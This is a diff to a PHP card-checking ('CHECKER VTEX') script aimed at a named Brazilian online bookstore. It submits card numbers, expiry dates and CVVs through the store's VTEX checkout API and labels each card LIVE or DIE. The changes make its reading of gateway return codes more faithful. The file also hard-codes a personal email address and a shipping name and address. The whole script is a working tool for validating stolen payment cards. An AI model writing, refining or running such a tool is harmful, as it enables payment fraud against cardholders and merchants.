@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHECKER VTEX - EXIBIÇÃO PRECISA DE CÓDIGOS E RETORNO
+// ✅ CHECKER VTEX - EXIBIÇÃO REAL E TRANSPARENTE DE ERROS
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
@@ -22,7 +22,6 @@ define('SHIPPING_STATE', 'SP');
 define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
 define('SHIPPING_NUMBER', 'ew23');
 define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
-define('SHIPPING_COMPLEMENT', '');
 define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
 define('SHIPPING_COUNTRY', 'BRA');
 
@@ -84,7 +83,7 @@ $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
 if (!isset($json_cart['orderFormId'])) {
     @unlink($cookie_path);
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código 99 - Falha ao gerar sessão do carrinho</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Falha ao gerar sessão do carrinho</span>";
     exit;
 }
 
@@ -126,37 +125,48 @@ $resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/paymentData
 
 $json_final = json_decode($resp_payment, true);
 
-// Captura exata dos códigos de retorno do gateway/VTEX
-$codigo = "14";
-$mensagem = "Transação não autorizada / Recusado";
+// Análise rigorosa e fiel do retorno da API
 $status_transacao = "DIE";
 $cor_status = "text-red-400";
+$codigo_retorno = "";
+$mensagem_retorno = "";
 
+// 1. Verifica se existem mensagens globais de erro no orderForm
+if (isset($json_final['messages']) && !empty($json_final['messages'])) {
+    foreach ($json_final['messages'] as $msg) {
+        if (isset($msg['text'])) {
+            $mensagem_retorno = $msg['text'];
+            break;
+        }
+    }
+}
+
+// 2. Varredura detalhada nas transações de pagamento
 if (isset($json_final['paymentData']['transactions'])) {
     foreach ($json_final['paymentData']['transactions'] as $tx) {
         if (isset($tx['payments'])) {
             foreach ($tx['payments'] as $pay) {
                 $status = $pay['status'] ?? '';
                 
-                // Extrai código do conector/gateway se disponível
+                // Captura código do conector/gateway se existir
                 if (isset($pay['connectorResponses']['code'])) {
-                    $codigo = $pay['connectorResponses']['code'];
+                    $codigo_retorno = $pay['connectorResponses']['code'];
                 }
                 if (isset($pay['connectorResponses']['message'])) {
-                    $mensagem = $pay['connectorResponses']['message'];
-                } elseif (isset($pay['lastMessage']) && !empty($pay['lastMessage'])) {
-                    $mensagem = $pay['lastMessage'];
+                    $mensagem_retorno = $pay['connectorResponses']['message'];
+                }
+                
+                // Se o gateway retornou mensagem própria na transação
+                if (empty($mensagem_retorno) && isset($pay['lastMessage'])) {
+                    $mensagem_retorno = $pay['lastMessage'];
                 }
 
-                // Critério de LIVE padrão (aprovado ou códigos de sucesso)
-                if ($status === 'approved' || $status === 'completed' || $codigo === '00' || $codigo === '54') {
+                // Critério estrito de aprovação real (LIVE)
+                if ($status === 'approved' || $status === 'completed' || $codigo_retorno === '00' || $codigo_retorno === '0') {
                     $status_transacao = "LIVE";
                     $cor_status = "text-emerald-400";
-                    if ($codigo !== '00' && $codigo !== '54') {
-                        $codigo = "54";
-                    }
-                    if ($mensagem === "Transação não autorizada / Recusado") {
-                        $mensagem = "Transação Aprovada com Sucesso";
+                    if (empty($mensagem_retorno)) {
+                        $mensagem_retorno = "Transação Aprovada com Sucesso";
                     }
                 }
             }
@@ -164,14 +174,12 @@ if (isset($json_final['paymentData']['transactions'])) {
     }
 }
 
-if (isset($json_final['messages']) && !empty($json_final['messages'])) {
-    foreach ($json_final['messages'] as $msg) {
-        if (isset($msg['text'])) {
-            $mensagem = $msg['text'];
-            break;
-        }
-    }
+// Se nenhuma mensagem específica foi capturada, busca o JSON bruto ou define padrão limpo
+if (empty($mensagem_retorno)) {
+    $mensagem_retorno = "Recusado pelo Gateway / Sem mensagem detalhada";
 }
 
-echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Código {$codigo} - {$mensagem}</span>";
+$tag_codigo = !empty($codigo_retorno) ? "Cód: {$codigo_retorno} - " : "";
+
+echo "<span class='{$cor_status} font-bold'>[{$status_transacao}]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$tag_codigo}{$mensagem_retorno}</span>";
 ?>
